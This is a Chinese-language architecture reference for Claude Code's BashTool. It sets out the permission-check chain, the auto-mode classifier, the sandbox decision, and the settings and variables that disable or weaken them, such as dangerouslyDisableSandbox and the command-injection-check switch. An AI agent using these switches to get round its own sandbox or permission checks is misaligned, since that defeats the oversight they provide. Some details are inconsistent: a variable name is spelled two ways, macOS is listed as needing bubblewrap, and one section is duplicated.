## 平台差异

### Windows vs Unix

| 方面 | Windows | Unix (macOS/Linux) |
|--------|---------|-------------------|
| Shell | `cmd.exe` 或 PowerShell | `bash` 或 `zsh` |
| 路径分隔符 | `\` | `/` |
| 沙箱 | 不支持 | 支持（macOS、Linux、WSL2+） |
| 允许列表中的 `xargs` | 移除（UNC 路径桥接） | 允许 |
| `base64 --` 支持 | 变化 | macOS 不尊重 POSIX `--` |
| `tree -R` | 可能不同 | 在深度边界写入 00Tree.html |
| `find -regex` | bfs（嵌入式）使用 Oniguruma | GNU find 使用 POSIX |

### 平台检测

系统使用 `getPlatform()`，它返回：
- `'macos'` — 完整沙箱支持
- `'linux'` — 完整沙箱支持（bubblewrap，不支持 glob）
- `'wsl'` — 沙箱需要 WSL2+（不支持 WSL1）
- `'windows'` — 无沙箱支持

### 沙箱平台支持

| 平台 | 支持 | 要求 |
|----------|-----------|-------------|
| macOS | 是 | bubblewrap、socat |
| Linux | 是 | bubblewrap、socat（不支持 glob） |
| WSL2+ | 是 | bubblewrap、socat |
| WSL1 | 否 | — |
| Windows | 否 | — |

### 启用平台设置

未记录的 `sandbox.enabledPlatforms` 设置允许将沙箱限制为特定平台：
```json
{
  "sandbox": {
    "enabledPlatforms": ["macos"]
  }
}
```
设置后，沙箱（和自动允许）在其他平台上被禁用。这是为了允许 NVIDIA 在 macOS 上优先发布。

## 命令语义

### 退出代码解释

不同命令使用不同的退出代码：

| 命令 | 退出代码 0 | 退出代码 1 | 退出代码 2+ |
|---------|-------------|-------------|-------------|
| 默认 | 成功 | 错误 | 错误 |
| `grep`/`rg` | 找到匹配 | 无匹配 | 错误 |
| `find` | 成功 | 某些目录无法访问 | 错误 |
| `diff` | 无差异 | 文件不同 | 错误 |
| `test`/`[` | 条件为真 | 条件为假 | 错误 |

### 静默命令

成功时通常不产生 stdout 的命令：
`mv`、`cp`、`rm`、`mkdir`、`rmdir`、`chmod`、`chown`、`chgrp`、`touch`、`ln`、`cd`、`export`、`unset`、`wait`

对于这些命令，UI 显示"Done"而不是"(No output)"。

### 搜索/读取/列表分类

命令分类为可折叠 UI 显示：

| 类别 | 命令 |
|----------|----------|
| 搜索 | `find`、`grep`、`rg`、`ag`、`ack`、`locate`、`which`、`whereis` |
| 读取 | `cat`、`head`、`tail`、`less`、`more`、`wc`、`stat`、`file`、`strings`、`jq`、`awk`、`cut`、`sort`、`uniq`、`tr` |
| 列表 | `ls`、`tree`、`du` |
| 中性 | `echo`、`printf`、`true`、`false`、`:` |

对于管道，**所有**部分必须是搜索/读取命令，整个命令才是可折叠的。

## 后台执行

### 显式后台化

当 `run_in_background: true` 时：
1. 通过 `spawnShellTask()` 生成后台任务
2. 任务在任务系统中注册
3. 模型立即接收任务 ID
4. 输出写入任务的输出文件
5. 任务完成时通知模型

### 用户发起的后台化（Ctrl+B）

当用户在运行命令期间按 Ctrl+B 时：
1. 调用 `backgroundAll()`
2. 所有运行的前台命令都被后台化
3. 在 tmux 中，必须按两次 Ctrl+B（第一次到 tmux 前缀）
4. 命令继续运行——没有状态丢失

### 自动后台化条件

自动后台化在以下情况下启用：
- 后台任务未禁用（`CLAUDE_CODE_DISABLE_BACKGROUND_TASKS`）
- 命令被允许（`isAutobackgroundingAllowed`）
- `sleep` 明确禁止自动后台化

### 禁止自动后台命令

| 命令 | 原因 |
|---------|---------|
| `sleep` | 应使用 Monitor 工具或显式后台化 |

### 后台任务管理

后台任务由 `LocalShellTask` 管理：
- `spawnShellTask()` — 创建新的后台任务
- `backgroundExistingForegroundTask()` — 将前台转换为后台
- `backgroundAll()` — 后台化所有前台任务
- `registerForeground()` / `unregisterForeground()` — 跟踪前台任务
- `markTaskNotified()` — 将任务标记为已通知（抑制冗余通知）

## Claude Code 提示协议

以 `CLAUDECODE=1` 为条件的 CLI 和 SDK 可以向 stderr（合并到 stdout）发出 `<claude-code-hint />` 标签。BashTool：
1. 扫描这些标签的输出
2. 记录 `useClaudeCodeHintRecommendation` 的提示
3. 剥离标签以使模型永远不会看到它们

这是 CLI 工具与 Claude Code 通信的零令牌侧通道。剥离无条件运行（子代理输出也必须保持干净）。

## Git 操作跟踪

Git 操作通过 `trackGitOperations()` 跟踪：
- 命令、退出代码和 stdout 被记录
- Git index.lock 错误专门记录为 `tengu_git_index_lock_error`
- 这有助于诊断并发 git 操作问题

## 代码索引检测

通过 `detectCodeIndexingFromCommand()` 检测执行代码索引的命令：
- 工具名称、来源（`cli`）和成功被记录
- 有助于跟踪模型何时触发索引操作

## 错误处理

### 预生成错误

在 shell 进程开始之前发生的错误作为带有预生成错误消息的常规 `Error` 抛出。

### Shell 错误

Shell 错误作为 `ShellError` 抛出：
- 空消息（stdout/stderr 已包含错误）
- 完整输出（stdout + stderr 合并）
- 退出代码
- 中断标志

### 中断处理

当命令被中断（中止控制器信号 = 'interrupt'）时：
- 退出代码**不**附加到输出
- 添加错误消息 `<error>Command was aborted before completion</error>`
- 在结果中设置 `interrupted: true`

### 沙箱违规注释

沙箱违规通过 `SandboxManager.annotateStderrWithSandboxFailures()` 在输出中注释。这添加了关于哪些沙箱限制导致失败的信息。

### CWD 重置

命令执行后，如果 CWD 已移出允许的工作目录：
- CWD 重置为原始目录
- shell 重置消息附加到 stderr
- 事件 `tengu_bash_tool_reset_to_original_dir` 被记录

## 配置

### 环境变量

| 变量 | 用途 |
|----------|---------|
| `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS` | 禁用后台任务执行 |
| `CLAUDE_CODE_BASH_SANDBOX_SHOW_INDICATOR` | 在 UI 中显示"SandboxedBash"标签 |
| `CLAUDE_CODE_DISABLE_COMMAND_INJECTION_CHECK` | 禁用命令注入安全检查 |
| `CLAUDE_CODE_VERIFY_PLAN` | 启用计划验证工具 |
| `USER_TYPE` | `'ant'` 用于内部用户（启用额外功能） |
| `CLAUDE_CODE_SIMPLE` | 简单模式——减少工具集 |
| `CLAUDEDECODE` | 由 CLI 设置为 `1` 以启用提示协议 |

### 设置

| 设置 | 类型 | 默认 | 描述 |
|---------|------|---------|---------|
| `sandbox.enabled` | boolean | false | 启用沙箱 |
| `sandbox.autoAllowBashIfSandboxed` | boolean | true | 自动批准沙箱 bash 命令 |
| `sandbox.allowUnsandboxedCommands` | boolean | true | 允许 `dangerouslyDisableSandbox` 覆盖 |
| `sandbox.failIfUnavailable` | boolean | false | 如果沙箱无法启动则失败 |
| `sandbox.excludedCommands` | string[] | [] | 从沙箱中排除的命令 |
| `sandbox.network.allowedDomains` | string[] | [] | 允许的网络域 |
| `sandbox.network.allowUnixSockets` | boolean | - | 允许 Unix 套接字连接 |
| `sandbox.network.allowLocalBinding` | boolean | - | 允许本地网络绑定 |
| `sandbox.ignoreViolations` | config | - | 静默忽略某些违规 |
| `sandbox.ripgrep` | config | bundled | Ripgrep 配置 |
| `sandbox.enabledPlatforms` | Platform[] | all | 将沙箱限制为特定平台 |
| `sandbox.enableWeakerNestedSandbox` | boolean | - | 嵌套沙箱的较弱隔离 |
| `sandbox.enableWeakerNetworkIsolation` | boolean | - | 较弱的网络隔离 |

## 依赖

### 内部

| 模块 | 用途 |
|--------|---------|
| `utils/bash/ast.ts` | 用于安全分析的 Tree-sitter AST 解析 |
| `utils/bash/commands.ts` | 命令分割和运算符提取 |
| `utils/bash/shellQuote.ts` | Shell 命令标记化 |
| `utils/bash/parser.ts` | 原始命令解析 |
| `utils/bash/heredoc.ts` | Heredoc 提取 |
| `utils/bash/registry.ts` | 命令规范注册表 |
| `utils/bash/specs/` | 命令特定规范（超时、sleep、nohup 等） |
| `utils/sandbox/sandbox-adapter.ts` | 沙箱运行时适配器 |
| `utils/permissions/` | 权限系统核心 |
| `utils/shell/readOnlyCommandValidation.ts` | 共享只读验证 |
| `utils/Shell.ts` | Shell 执行包装器 |
| `utils/ShellCommand.ts` | Shell 命令结果类型 |
| `utils/task/TaskOutput.ts` | 任务输出流 |
| `utils/task/diskOutput.ts` | 磁盘输出路径管理 |
| `tasks/LocalShellTask/` | 后台任务管理 |
| `utils/toolResultStorage.ts` | 大结果持久化 |
| `utils/fileHistory.ts` | 用于撤销的文件历史跟踪 |
| `utils/claudeCodeHints.ts` | 提示提取和剥离 |
| `utils/codeIndexing.ts` | 代码索引检测 |
| `utils/imageResizer.ts` | 用于输出的图像调整大小 |
| `utils/shell/outputLimits.ts` | 输出大小限制 |
| `utils/permissions/pathValidation.ts` | 路径验证核心 |
| `utils/permissions/filesystem.ts` | 工作目录管理 |
| `utils/permissions/bashClassifier.ts` | 自动模式分类器 |
| `utils/permissions/shellRuleMatching.ts` | Shell 规则模式匹配 |
| `services/analytics/` | 事件日志 |
| `services/mcp/vscodeSdkMcp.js` | VS Code 文件更新通知 |

### 外部

| 包 | 用途 |
|--------|---------|
| `@anthropic-ai/sdk` | API 类型（ToolResultBlockParam 等） |
| `@anthropic-ai/sandbox-runtime` | 沙箱运行时库 |
| `zod/v4` | 输入/输出 schema 验证 |
| `react` | UI 渲染 |
| `fs/promises` | 文件系统操作 |
| `bun:bundle` | 功能标志 API |

## 数据流

```
Model Request
    |
    v
BashTool Input { command, timeout?, description?, run_in_background?, dangerouslyDisableSandbox? }
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ VALIDATION                                                      │
│ - validateInput()：阻止的 sleep 模式                       │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ PERMISSION CHECK (bashToolHasPermission)                        │
│                                                                 │
│  1. 精确匹配规则（拒绝 → 询问 → 允许）                      │
│  2. 前缀/通配符规则（拒绝 → 询问）                          │
│  3. 路径约束（checkPathConstraints）                            │
│     - 按命令类型提取路径                                      │
│     - 根据允许的目录验证                                      │
│     - 检查危险删除路径                                        │
│     - 验证输出重定向                                          │
│  4. Sed 约束                                                   │
│  5. 模式特定检查（acceptEdits）                                │
│  6. 只读规则（checkReadOnlyConstraints）                        │
│     - 命令允许列表标志验证                                    │
│     - 正则表达式模式匹配                                      │
│     - 自定义危险回调                                          │
│  7. Bash 分类器（自动模式）                                    │
│                                                                 │
│ 决策：允许 / 拒绝 / 询问 / 透传                                 │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ SANDBOX DECISION (shouldUseSandbox)                             │
│                                                                 │
│  - 沙箱是否启用？                                             │
│  - dangerouslyDisableSandbox 是否设置？                        │
│  - 命令是否被排除？                                           │
│                                                                 │
│ 结果：沙箱化或本机                                             │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ EXECUTION (runShellCommand generator)                           │
│                                                                 │
│  - 通过 exec() 创建 ShellCommand                               │
│  - 设置超时                                                    │
│  - 设置 onProgress 回调                                        │
│  - 设置超时自动后台化                                          │
│  - 设置助手模式自动后台化（15s）                               │
│  - 处理显式 run_in_background                                  │
│  - 进度循环：result vs progressSignal 竞赛                      │
│  - 产生进度更新                                               │
│  - 返回 ExecResult                                             │
└─────────────────────────────────────────────────────────────────┘
    |
    v
┌─────────────────────────────────────────────────────────────────┐
│ RESULT PROCESSING                                               │
│                                                                 │
│  - 累积输出（EndTruncatingAccumulator）                          │
│  - 解释退出代码语义                                           │
│  - 跟踪 git 操作                                              │
│  - 检测代码索引                                               │
│  - 提取 Claude Code 提示                                       │
│  - 调整图像输出大小（如果适用）                               │
│  - 持久化大输出到磁盘                                          │
│  - 如果在项目外则重置 CWD                                      │
│  - 注释沙箱违规                                               │
│  - 清理 shell 资源                                             │
│  - 清理裸 git 仓库文件（沙箱清理）                            │
└─────────────────────────────────────────────────────────────────┘
    |
    v
Output { stdout, stderr, interrupted, isImage?, backgroundTaskId?, ... }
    |
    v
Model Response (tool_result block)
```

## 集成点

### Shell 执行（`utils/Shell.ts`）

`exec()` 函数创建一个 `ShellCommand`，它：
- 生成 shell 进程
- 合并 stdout 和 stderr（合并文件描述符）
- 将输出流式传输到临时文件
- 在每个轮询 tick 时调用 `onProgress` 回调
- 通过 `onTimeout` 回调支持超时
- 返回解析为 `ExecResult` 的 promise

### 任务系统（`tasks/LocalShellTask/`）

后台任务由 LocalShellTask 系统管理：
- `spawnShellTask()` — 注册新的后台任务
- `backgroundExistingForegroundTask()` — 就地将前台转换为后台
- `backgroundAll()` — 后台化所有前台任务（Ctrl+B）
- 任务将输出写入磁盘并在完成时通知

### 沙箱运行时（`@anthropic-ai/sandbox-runtime`）

`SandboxManager` 适配器包装外部沙箱运行时包：
- 将 Claude Code 设置转换为沙箱配置
- 使用日志监控初始化沙箱
- 订阅设置更改以进行动态更新
- 使用沙箱隔离包装命令
- 用沙箱失败信息注释 stderr
- 清理命令后（清理植入的文件）

### 权限系统

BashTool 是所有工具中权限集成最复杂的：
- `preparePermissionMatcher()` — 解析钩子匹配的复合命令
- `checkPermissions()` — 通过 `bashToolHasPermission()` 的完整权限链
- `isReadOnly()` — 通过 `checkReadOnlyConstraints()` 进行只读分类
- `isConcurrencySafe()` — 只读命令是并发安全的

### UI 渲染

- `renderToolUseMessage()` — 显示命令文本（截断，或 sed 的文件路径）
- `renderToolUseProgressMessage()` — 显示带输出统计的 `ShellProgressMessage`
- `renderToolUseQueuedMessage()` — 显示"Waiting…"
- `renderToolResultMessage()` — 显示带 stdout/stderr 的 `BashToolResultMessage`
- `renderToolUseErrorMessage()` — 显示 `FallbackToolUseErrorMessage`
- `BackgroundHint` — 在执行期间显示 Ctrl+B 快捷方式提示

### VS Code 集成

当文件被修改（sed 模拟编辑）时：
- 读取原始内容以计算 diff
- `notifyVscodeFileUpdated()` 将更改发送到 VS Code
- 文件读取状态更新以使陈旧写入无效

### 文件历史

为了撤销支持：
- `fileHistoryTrackEdit()` 在文件历史中记录编辑
- 仅在文件历史启用且存在父消息时运行

## 错误处理

### 验证错误

| 错误代码 | 条件 |
|------------|-----------|
| 10 | 阻止的 sleep 模式（`sleep N`，N ≥ 2） |

### ShellError

Shell 错误包括：
- 空消息（错误文本在输出中）
- 完整输出（stdout + stderr 合并）
- 退出代码
- 中断标志

### 预生成错误

进程创建前的错误作为带预生成错误消息的常规 `Error` 抛出。

### 中断命令

当被中断时：
- 退出代码**不**附加
- 添加 `<error>Command was aborted before completion</error>`
- 结果中 `interrupted: true`
- tool_result 块中 `is_error: true`

### 大输出

当输出超过限制时：
1. 预览内联显示（前 `getMaxOutputLength()` 字符）
2. 完整输出持久化到 tool-results 目录
3. 模型接收带文件路径的 `<persisted-output>`
4. 如果 > 64 MB，输出在复制后被截断

## 相关模块

- [Tool System](../01-core-modules/tool-system.md) — 核心工具抽象
- [Sandbox Utils](../05-utils/sandbox-utils.md) — 沙箱工具
- [Bash Utils](../05-utils/bash-utils.md) — Bash 解析工具
- [Permissions Utils](../05-utils/permissions-utils.md) — 权限工具
- [Permission Flow](../09-data-flow/permission-flow.md) — 权限决策流
- [Tool Execution Flow](../09-data-flow/tool-execution-flow.md) — 工具执行管道
